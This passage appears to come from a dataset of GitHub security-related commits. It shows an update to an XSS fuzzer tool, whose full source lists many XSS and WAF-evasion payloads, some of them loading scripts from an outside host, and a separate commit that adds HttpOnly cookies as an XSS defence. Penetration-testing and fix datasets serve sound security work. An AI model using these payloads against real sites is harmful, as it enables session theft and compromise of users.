src='%s'></script>\" % self.url\n         return payload\n", "message": "", "files": {"/saker/fuzzers/xss.py": {"changes": [{"diff": "\n         # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n         return url + '/.well-known/acme-challenge/?<h1>hi'\n \n-    def img(self, payload):\n+    @classmethod\n+    def img(cls, payload):\n         return '<img/onerror=\"%s\"/src=x>' % payload\n \n-    def svg(self, payload):\n+    @classmethod\n+    def svg(cls, payload):\n         return '<svg/onload=\"%s\"/>' % payload\n \n-    def style(self, payload):\n+    @classmethod\n+    def style(cls, payload):\n         return '<style/onload=\"%s\"></style>' % payload\n \n-    def input(self, payload):\n+    @classmethod\n+    def input(cls, payload):\n         return '<input/onfocus=\"%s\"/autofocus>' % payload\n \n-    def marquee(self, payload):\n+    @classmethod\n+    def marquee(cls, payload):\n         return '<marquee/onstart=\"%s\"></marquee>' % payload\n \n-    def div(self, payload):\n+    @classmethod\n+    def div(cls, payload):\n         return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n \n+    @classmethod\n+    def template(cls, tag=\"img\", delimiter=\" \", event_handler=\"onerror\", javascript=\"alert(/xss/)\", ending=\">\"):\n+        '''\n+        delimiter \" \"\n+        delimiter \"\\x09\"\n+        delimiter \"\\x09\\x09\"\n+        delimiter \"/\"\n+        delimiter \"\\x0a\"\n+        delimiter \"\\x0d\"\n+        delimiter \"/~/\"\n+        ending \">\"\n+        ending \"//\"\n+        ending \" \"\n+        ending \"\\t\"\n+        ending \"\\n\"\n+        '''\n+        return f\"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}\"\n+\n     def script(self):\n         payload = \"<script src='%s'></script>\" % self.url\n         return payload\n", "add": 30, "remove": 6, "filename": "/saker/fuzzers/xss.py", "badparts": ["    def img(self, payload):", "    def svg(self, payload):", "    def style(self, payload):", "    def input(self, payload):", "    def marquee(self, payload):", "    def div(self, payload):"], "goodparts": ["    @classmethod", "    def img(cls, payload):", "    @classmethod", "    def svg(cls, payload):", "    @classmethod", "    def style(cls, payload):", "    @classmethod", "    def input(cls, payload):", "    @classmethod", "    def marquee(cls, payload):", "    @classmethod", "    def div(cls, payload):", "    @classmethod", "    def template(cls, tag=\"img\", delimiter=\" \", event_handler=\"onerror\", javascript=\"alert(/xss/)\", ending=\">\"):", "        '''", "        delimiter \" \"", "        delimiter \"\\x09\"", "        delimiter \"\\x09\\x09\"", "        delimiter \"/\"", "        delimiter \"\\x0a\"", "        delimiter \"\\x0d\"", "        delimiter \"/~/\"", "        ending \">\"", "        ending \"//\"", "        ending \" \"", "        ending \"\\t\"", "        ending \"\\n\"", "        '''", "        return f\"<{tag}{delimiter}{event_handler}={javascript}{delimiter}{ending}\""]}], "source": "\n from saker.fuzzers.fuzzer import Fuzzer _tags=[ 'a', 'abbr', 'acronym', 'address', 'applet', 'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'bgsound', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'iframe', 'image', 'img', 'input', 'ins', 'isindex', 'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr', 'xmp', ] _events=[ 'onabort', 'onautocomplete', 'onautocompleteerror', 'onafterscriptexecute', 'onanimationend', 'onanimationiteration', 'onanimationstart', 'onbeforecopy', 'onbeforecut', 'onbeforeload', 'onbeforepaste', 'onbeforescriptexecute', 'onbeforeunload', 'onbegin', 'onblur', 'oncanplay', 'oncanplaythrough', 'onchange', 'onclick', 'oncontextmenu', 'oncopy', 'oncut', 'ondblclick', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', 'onloadedmetadata', 'onloadstart', 'onmessage', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 'ontouchstart', 'ontransitionend', 'onunload', 'onvolumechange', 'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration', 'onwebkitanimationstart', 'onwebkitfullscreenchange', 'onwebkitfullscreenerror', 'onwebkitkeyadded', 'onwebkitkeyerror', 'onwebkitkeymessage', 'onwebkitneedkey', 'onwebkitsourceclose', 'onwebkitsourceended', 'onwebkitsourceopen', 'onwebkitspeechchange', 'onwebkittransitionend', 'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'';!--\"<XSS>=&{()}\"\"\", ] _payloads=[ '<q/oncut=open()>', '<svg/onload=eval(name)>', '<svg/onload=eval(window.name)>', '<svg/onload=eval(location.hash.slice(1))>', '<img src=x onerror=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\", \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\" ] _waf_payloads=[ \"<IMG SRC=JaVaScRiPt:alert('xss')>\", '<<script>alert(\"xss\");//<</script>', \"\"\"<img src=\"javascript:alert('xss')\" \"\"\", '<a href=\"javascript%26colon;alert(1)\">click', '<a href=javas& '<--`<img/src=` onerror=confirm``> --!>', '\\'\"</Script><Html Onmouseover=(confirm)()//' '<imG/sRc=l oNerrOr=(prompt)() x>', '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confi\\u0072m()>', '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//t.cn>', '<embed//sRc=//t.cn>', '<base href=//t.cn/><script src=/>', '<object//data=//t.cn>', '<s=\" onclick=confirm``>clickme', '<svG oNLoad=co\\u006efirm& '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>', '<scriscriptpt>alert(/xss/)</scriscriptpt>', '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be' ] _h5payloads=[ '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>', '<input onfocus=alert(1) autofocus>', '<input onblur=alert(1) autofocus><input autofocus>', '<body onscroll=alert(1)>' +'<br>' * 100 +'<input autofocus>', '<video><source onerror=\"alert(1)\">', '<video onerror=\"alert(1)\"><source></source></video>', '<form><button formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @classmethod def alterTest(cls, p=False): return \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return payload def cspBypass(self): return \"<link rel='preload' href='%s'>\" % self.url ", "sourceWithComments": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nfrom saker.fuzzers.fuzzer import Fuzzer\n\n_tags = [\n    'a',\n    'abbr',\n    'acronym',\n    'address',\n    'applet',\n    'area',\n    'article',\n    'aside',\n    'audio',\n    'b',\n    'base',\n    'basefont',\n    'bdi',\n    'bdo',\n    'bgsound',\n    'big',\n    'blink',\n    'blockquote',\n    'body',\n    'br',\n    'button',\n    'canvas',\n    'caption',\n    'center',\n    'cite',\n    'code',\n    'col',\n    'colgroup',\n    'command',\n    'content',\n    'data',\n    'datalist',\n    'dd',\n    'del',\n    'details',\n    'dfn',\n    'dialog',\n    'dir',\n    'div',\n    'dl',\n    'dt',\n    'element',\n    'em',\n    'embed',\n    'fieldset',\n    'figcaption',\n    'figure',\n    'font',\n    'footer',\n    'form',\n    'frame',\n    'frameset',\n    'h1',\n    'h2',\n    'h3',\n    'h4',\n    'h5',\n    'h6',\n    'head',\n    'header',\n    'hgroup',\n    'hr',\n    'html',\n    'i',\n    'iframe',\n    'image',\n    'img',\n    'input',\n    'ins',\n    'isindex',\n    'kbd',\n    'keygen',\n    'label',\n    'layer',\n    'legend',\n    'li',\n    'link',\n    'listing',\n    'main',\n    'map',\n    'mark',\n    'marquee',\n    'menu',\n    'menuitem',\n    'meta',\n    'meter',\n    'multicol',\n    'nav',\n    'nobr',\n    'noembed',\n    'noframes',\n    'nolayer',\n    'noscript',\n    'object',\n    'ol',\n    'optgroup',\n    'option',\n    'output',\n    'p',\n    'param',\n    'picture',\n    # 'plaintext',\n    'pre',\n    'progress',\n    'q',\n    'rp',\n    'rt',\n    'rtc',\n    'ruby',\n    's',\n    'samp',\n    'script',\n    'section',\n    'select',\n    'shadow',\n    'small',\n    'source',\n    'spacer',\n    'span',\n    'strike',\n    'strong',\n    'style',\n    'sub',\n    'summary',\n    'sup',\n    'table',\n    'tbody',\n    'td',\n    'template',\n    'textarea',\n    'tfoot',\n    'th',\n    'thead',\n    'time',\n    'title',\n    'tr',\n    'track',\n    'tt',\n    'u',\n    'ul',\n    'var',\n    'video',\n    'wbr',\n    'xmp',\n]\n\n_events = [\n    'onabort',\n    'onautocomplete',\n    'onautocompleteerror',\n    'onafterscriptexecute',\n    'onanimationend',\n    'onanimationiteration',\n    'onanimationstart',\n    'onbeforecopy',\n    'onbeforecut',\n    'onbeforeload',\n    'onbeforepaste',\n    'onbeforescriptexecute',\n    'onbeforeunload',\n    'onbegin',\n    'onblur',\n    'oncanplay',\n    'oncanplaythrough',\n    'onchange',\n    'onclick',\n    'oncontextmenu',\n    'oncopy',\n    'oncut',\n    'ondblclick',\n    'ondrag',\n    'ondragend',\n    'ondragenter',\n    'ondragleave',\n    'ondragover',\n    'ondragstart',\n    'ondrop',\n    'ondurationchange',\n    'onend',\n    'onemptied',\n    'onended',\n    'onerror',\n    'onfocus',\n    'onfocusin',\n    'onfocusout',\n    'onhashchange',\n    'oninput',\n    'oninvalid',\n    'onkeydown',\n    'onkeypress',\n    'onkeyup',\n    'onload',\n    'onloadeddata',\n    'onloadedmetadata',\n    'onloadstart',\n    'onmessage',\n    'onmousedown',\n    'onmouseenter',\n    'onmouseleave',\n    'onmousemove',\n    'onmouseout',\n    'onmouseover',\n    'onmouseup',\n    'onmousewheel',\n    'onoffline',\n    'ononline',\n    'onorientationchange',\n    'onpagehide',\n    'onpageshow',\n    'onpaste',\n    'onpause',\n    'onplay',\n    'onplaying',\n    'onpopstate',\n    'onprogress',\n    'onratechange',\n    'onreset',\n    'onresize',\n    'onscroll',\n    'onsearch',\n    'onseeked',\n    'onseeking',\n    'onselect',\n    'onselectionchange',\n    'onselectstart',\n    'onstalled',\n    'onstorage',\n    'onsubmit',\n    'onsuspend',\n    'ontimeupdate',\n    'ontoggle',\n    'ontouchcancel',\n    'ontouchend',\n    'ontouchmove',\n    'ontouchstart',\n    'ontransitionend',\n    'onunload',\n    'onvolumechange',\n    'onwaiting',\n    'onwebkitanimationend',\n    'onwebkitanimationiteration',\n    'onwebkitanimationstart',\n    'onwebkitfullscreenchange',\n    'onwebkitfullscreenerror',\n    'onwebkitkeyadded',\n    'onwebkitkeyerror',\n    'onwebkitkeymessage',\n    'onwebkitneedkey',\n    'onwebkitsourceclose',\n    'onwebkitsourceended',\n    'onwebkitsourceopen',\n    'onwebkitspeechchange',\n    'onwebkittransitionend',\n    'onwheel'\n]\n\n_htmlTemplate = '''\n<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Fuzzer</title>\n    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n</head>\n<body>\n%s\n</body>\n</html>\n'''\n\n# probe for test xss vuln\n_probes = [\n    \"\"\"'';!--\"<XSS>=&{()}\"\"\",\n]\n\n# xss payloads\n_payloads = [\n    '<q/oncut=open()>',\n    '<svg/onload=eval(name)>',\n    '<svg/onload=eval(window.name)>',\n    '<svg/onload=eval(location.hash.slice(1))>',\n    '<img src=x onerror=alert(/xss/)>',\n    \"\"\"<img src=\"javascript:alert('xss');\">\"\"\",\n    \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\",\n    \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('xss');\">\"\"\",\n    \"\"\"<meta http-equiv=\"refresh\" content=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\",\n    \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-\"\"\"\n]\n\n# payload for waf test\n_waf_payloads = [\n    \"<IMG SRC=JaVaScRiPt:alert('xss')>\",\n    '<<script>alert(\"xss\");//<</script>',\n    \"\"\"<img src=\"javascript:alert('xss')\" \"\"\",\n    '<a href=\"javascript%26colon;alert(1)\">click',\n    '<a href=javas&#99;ript:alert(1)>click',\n    '<--`<img/src=` onerror=confirm``> --!>',\n    '\\'\"</Script><Html Onmouseover=(confirm)()//'\n    '<imG/sRc=l oNerrOr=(prompt)() x>',\n    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',\n    '<deTails open oNToggle=confi\\u0072m()>',\n    '<img sRc=l oNerrOr=(confirm)() x>',\n    '<svg/x=\">\"/onload=confirm()//',\n    '<svg%0Aonload=%09((pro\\u006dpt))()//',\n    '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>',\n    '<sCript x>confirm``</scRipt x>',\n    '<Script x>prompt()</scRiPt x>',\n    '<sCriPt sRc=//t.cn>',\n    '<embed//sRc=//t.cn>',\n    '<base href=//t.cn/><script src=/>',\n    '<object//data=//t.cn>',\n    '<s=\" onclick=confirm``>clickme',\n    '<svG oNLoad=co\\u006efirm&#x28;1&#x29>',\n    '\\'\"><y///oNMousEDown=((confirm))()>Click',\n    '<a/href=javascript&colon;co\\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',\n    '<img src=x onerror=confir\\u006d`1`>',\n    '<svg/onload=co\\u006efir\\u006d`1`>',\n    '<?xml version=\"1.0\"?><html><script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script></html>',\n    '<scriscriptpt>alert(/xss/)</scriscriptpt>',\n    '\u00bcscript\u00bealert(\u00a2XSS\u00a2)\u00bc/script\u00be'\n]\n\n# payload with html 5 features\n# http://html5sec.org\n_h5payloads = [\n    '<form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>',\n    '<input onfocus=alert(1) autofocus>',\n    '<input onblur=alert(1) autofocus><input autofocus>',\n    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',\n    '<video><source onerror=\"alert(1)\">',\n    '<video onerror=\"alert(1)\"><source></source></video>',\n    '<form><button formaction=\"javascript:alert(1)\">X</button>',\n    '<math href=\"javascript:alert(1)\">CLICKME</math>',\n    '<link rel=\"import\" href=\"test.svg\" />',\n    '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;\" />',\n]\n\n\nclass XSS(Fuzzer):\n\n    \"\"\"generate XSS payload\"\"\"\n\n    tags = _tags\n    events = _events\n    htmlTemplate = _htmlTemplate\n    probes = _probes\n    payloads = _payloads\n    waf_payloads = _waf_payloads\n    h5payloads = _h5payloads\n\n    def __init__(self, url=\"\"):\n        \"\"\"\n        url: xss payload url\n        \"\"\"\n        super(XSS, self).__init__()\n        self.url = url\n\n    @classmethod\n    def alterTest(cls, p=False):\n        return \"<script>alert(/xss/)</script>\"\n\n    @classmethod\n    def genTestHTML(cls):\n        s = ''\n        for t in cls.tags:\n            s += '<%s src=\"x\"' % t\n            for e in cls.events:\n                s += ''' %s=\"console.log('%s %s')\" ''' % (e, t, e)\n            s += '>%s</%s>\\n' % (t, t)\n        return cls.htmlTemplate % s\n\n    @classmethod\n    def acmehttp01(cls, url):\n        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/\n        return url + '/.well-known/acme-challenge/?<h1>hi'\n\n    def img(self, payload):\n        return '<img/onerror=\"%s\"/src=x>' % payload\n\n    def svg(self, payload):\n        return '<svg/onload=\"%s\"/>' % payload\n\n    def style(self, payload):\n        return '<style/onload=\"%s\"></style>' % payload\n\n    def input(self, payload):\n        return '<input/onfocus=\"%s\"/autofocus>' % payload\n\n    def marquee(self, payload):\n        return '<marquee/onstart=\"%s\"></marquee>' % payload\n\n    def div(self, payload):\n        return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload\n\n    def script(self):\n        payload = \"<script src='%s'></script>\" % self.url\n        return payload\n\n    def event(self, element, src, event, js):\n        payload = \"<%s src=\" % element\n        payload += '\"%s\" ' % src\n        payload += event\n        payload += \"=%s >\" % js\n        return payload\n\n    def cspBypass(self):\n        return \"<link rel='preload' href='%s'>\" % self.url\n"}}, "msg": "update xss fuzzer"}}, "https://github.com/SUNET/eduid-IdP": {"e106ab1a6491342c9084772fba9f5c7b29be8d65": {"url": "https://api.github.com/repos/SUNET/eduid-IdP/commits/e106ab1a6491342c9084772fba9f5c7b29be8d65", "html_url": "https://github.com/SUNET/eduid-IdP/commit/e106ab1a6491342c9084772fba9f5c7b29be8d65", "sha": "e106ab1a6491342c9084772fba9f5c7b29be8d65", "keyword": "XSS protect", "diff": "diff --git a/setup.py b/setup.py\nindex 54379db..8ea5193 100755\n--- a/setup.py\n+++ b/setup.py\n@@ -7,7 +7,7 @@\n here = os.path.abspath(os.path.dirname(__file__))\n README = open(os.path.join(here, 'README')).read()\n \n-version = '0.3.22'\n+version = '0.3.23b0'\n \n install_requires = [\n     'pymongo>=2.8,<3',\ndiff --git a/src/eduid_idp/config.py b/src/eduid_idp/config.py\nindex c0dabb5..d1e1e40 100644\n--- a/src/eduid_idp/config.py\n+++ b/src/eduid_idp/config.py\n@@ -62,18 +62,19 @@\n                     'content_packages': [],  # List of Python packages (\"name:path\") with content resources\n                     'verify_request_signatures': '0',  # '1' for True, '0' for False\n                     'status_test_usernames': [],\n-                    'signup_link': '#',  # for login.html\n-                    'dashboard_link': '#',  # for forbidden.html\n-                    'password_reset_link': '#',  # for login.html\n+                    'signup_link': '#',         # for login.html\n+                    'dashboard_link': '#',      # for forbidden.html\n+                    'password_reset_link': '#', # for login.html\n                     'default_language': 'en',\n                     'base_url': None,\n                     'default_eppn_scope': None,\n                     'authn_info_mongo_uri': None,\n-                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100\n+                    'max_authn_failures_per_month': '50', # Kantara 30-day bad authn limit is 100\n                     'login_state_ttl': '5',   # time to complete an IdP login, in minutes\n                     'default_scoped_affiliation': None,\n-                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL\n-                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag\n+                    'vccs_url': 'http://localhost:8550/', # VCCS backend URL\n+                    'insecure_cookies': '0', # Set to 1 to not set HTTP Cookie 'secure' flag\n+                    'httponly_cookies': '1', # Set to 0 to not protect against XSS vulnerabilities.\n                     }\n \n _CONFIG_SECTION = 'eduid_idp'\n@@ -423,3 +424,13 @@ def insecure_cookies(self):\n         Set to True to NOT set HTTP Cookie 'secure' flag (boolean).\n         \"\"\"\n         return self.config.getboolean(self.section, 'insecure_cookies')\n+\n+    @property\n+    def httponly_cookies(self):\n+        \"\"\"\n+        Set to False to NOT set HTTP Cookie 'httponly' flag (boolean).\n+\n+        This flag protects against common cross-site scripting (XSS) by\n+        not allowing client side scripts e.g. JavaScript to access cookies.\n+        \"\"\"\n+        return self.config.getboolean(self.section, 'httponly_cookies')\ndiff --git a/src/eduid_idp/mischttp.py b/src/eduid_idp/mischttp.py\nindex f1e069a..8d361d3 100644\n--- a/src/eduid_idp/mischttp.py\n+++ b/src/eduid_idp/mischttp.py\n@@ -313,6 +313,8 @@ def set_cookie(name, path, logger, config, value=''):\n     cookie[name]['path'] = path\n     if not config.insecure_cookies:\n         cookie[name]['secure'] = True  # ask browser to only send cookie using SSL/TLS\n+    if config.httponly_cookies:\n+        cookie[name]['httponly'] = True # protect against common XSS vulnerabilities\n     logger.debug(\"Set cookie : {!s}\".format(cookie))\n     return True\n \n", "message": "", "files": {"/setup.py": {"changes": [{"diff": "\n here = os.path.abspath(os.path.dirname(__file__))\n README = open(os.path.join(here, 'README')).read()\n \n-version = '0.3.22'\n+version = '0.3.23b0'\n \n install_requires = [\n     'pymongo>=2.8,<3',", "add": 1, "remove": 1, "filename": "/setup.py", "badparts": ["version = '0.3.22'"], "goodparts": ["version = '0.3.23b0'"]}], "source": "\n from setuptools import setup, find_packages import sys, os from distutils import versionpredicate here=os.path.abspath(os.path.dirname(__file__)) README=open(os.path.join(here, 'README')).read() version='0.3.22' install_requires=[ 'pymongo>=2.8,<3', 'pysaml2==1.2.0beta5', 'python-memcached==1.53', 'cherrypy==3.2.4', 'vccs_client==0.4.1', 'eduid_am>=0.5.3', ] testing_extras=[ 'nose==1.2.1', 'coverage==3.6', ] setup(name='eduid_idp', version=version, description=\"eduID SAML frontend IdP\", long_description=README, classifiers=[ ], keywords='eduID SAML', author='Fredrik Thulin', author_email='fredrik@thulin.net', license='BSD', packages=['eduid_idp',], package_dir={'': 'src'}, zip_safe=False, install_requires=install_requires, extras_require={ 'testing': testing_extras, }, entry_points={ 'console_scripts':['eduid_idp=eduid_idp.idp:main', ] } ) ", "sourceWithComments": "#!/usr/bin/env python\n#\nfrom setuptools import setup, find_packages\nimport sys, os\nfrom distutils import versionpredicate\n\nhere = os.path.abspath(os.path.dirname(__file__))\nREADME = open(os.path.join(here, 'README')).read()\n\nversion = '0.3.22'\n\ninstall_requires = [\n    'pymongo>=2.8,<3',\n    'pysaml2==1.2.0beta5',\n    'python-memcached==1.53',\n    'cherrypy==3.2.4',\n    'vccs_client==0.4.1',\n    'eduid_am>=0.5.3',\n]\n\ntesting_extras = [\n    'nose==1.2.1',\n    'coverage==3.6',\n]\n\nsetup(name='eduid_idp',\n      version=version,\n      description=\"eduID SAML frontend IdP\",\n      long_description=README,\n      classifiers=[\n        # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n        ],\n      keywords='eduID SAML',\n      author='Fredrik Thulin',\n      author_email='fredrik@thulin.net',\n      license='BSD',\n      packages=['eduid_idp',],\n      package_dir = {'': 'src'},\n      #include_package_data=True,\n      #package_data = { },\n      zip_safe=False,\n      install_requires=install_requires,\n      extras_require={\n        'testing': testing_extras,\n        },\n      entry_points={\n        'console_scripts': ['eduid_idp=eduid_idp.idp:main',\n                            ]\n        }\n      )\n"}, "/src/eduid_idp/config.py": {"changes": [{"diff": "\n                     'content_packages': [],  # List of Python packages (\"name:path\") with content resources\n                     'verify_request_signatures': '0',  # '1' for True, '0' for False\n                     'status_test_usernames': [],\n-                    'signup_link': '#',  # for login.html\n-                    'dashboard_link': '#',  # for forbidden.html\n-                    'password_reset_link': '#',  # for login.html\n+                    'signup_link': '#',         # for login.html\n+                    'dashboard_link': '#',      # for forbidden.html\n+                    'password_reset_link': '#', # for login.html\n                     'default_language': 'en',\n                     'base_url': None,\n                     'default_eppn_scope': None,\n                     'authn_info_mongo_uri': None,\n-                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100\n+                    'max_authn_failures_per_month': '50', # Kantara 30-day bad authn limit is 100\n                     'login_state_ttl': '5',   # time to complete an IdP login, in minutes\n                     'default_scoped_affiliation': None,\n-                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL\n-                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag\n+                    'vccs_url': 'http://localhost:8550/', # VCCS backend URL\n+                    'insecure_cookies': '0', # Set to 1 to not set HTTP Cookie 'secure' flag\n+                    'httponly_cookies': '1', # Set to 0 to not protect against XSS vulnerabilities.\n                     }\n \n _CONFIG_SECTION = 'eduid_idp'\n", "add": 7, "remove": 6, "filename": "/src/eduid_idp/config.py", "badparts": ["                    'signup_link': '#',  # for login.html", "                    'dashboard_link': '#',  # for forbidden.html", "                    'password_reset_link': '#',  # for login.html", "                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100", "                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL", "                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag"], "goodparts": ["                    'signup_link': '#',         # for login.html", "                    'dashboard_link': '#',      # for forbidden.html", "                    'password_reset_link': '#', # for login.html", "                    'max_authn_failures_per_month': '50', # Kantara 30-day bad authn limit is 100", "                    'vccs_url': 'http://localhost:8550/', # VCCS backend URL", "                    'insecure_cookies': '0', # Set to 1 to not set HTTP Cookie 'secure' flag", "                    'httponly_cookies': '1', # Set to 0 to not protect against XSS vulnerabilities."]}], "source": "\n \"\"\" Configuration(file) handling for eduID IdP. \"\"\" import os import ConfigParser _CONFIG_DEFAULTS={'debug': False, 'syslog_debug': '0', 'num_threads': '8', 'logdir': None, 'logfile': None, 'syslog_socket': None, 'listen_addr': '0.0.0.0', 'listen_port': '8088', 'pysaml2_config': 'idp_conf.py', 'fticks_secret_key': None, 'fticks_format_string': 'F-TICKS/SWAMID/2.0 'static_dir': None, 'ssl_adapter': 'builtin', 'server_cert': None, 'server_key': None, 'cert_chain': None, 'userdb_mongo_uri': None, 'userdb_mongo_database': None, 'sso_session_lifetime': '15', 'sso_session_mongo_uri': None, 'raven_dsn': None, 'content_packages':[], 'verify_request_signatures': '0', 'status_test_usernames':[], 'signup_link': ' 'dashboard_link': ' 'password_reset_link': ' 'default_language': 'en', 'base_url': None, 'default_eppn_scope': None, 'authn_info_mongo_uri': None, 'max_authn_failures_per_month': '50', 'login_state_ttl': '5', 'default_scoped_affiliation': None, 'vccs_url': 'http://localhost:8550/', 'insecure_cookies': '0', } _CONFIG_SECTION='eduid_idp' class IdPConfig(object): \"\"\" Class holding IdP application configuration. Loads configuration from an INI-file at instantiation. :param filename: string, INI-file name :param debug: boolean, default debug value :raise ValueError: if INI-file can't be parsed \"\"\" def __init__(self, filename, debug): 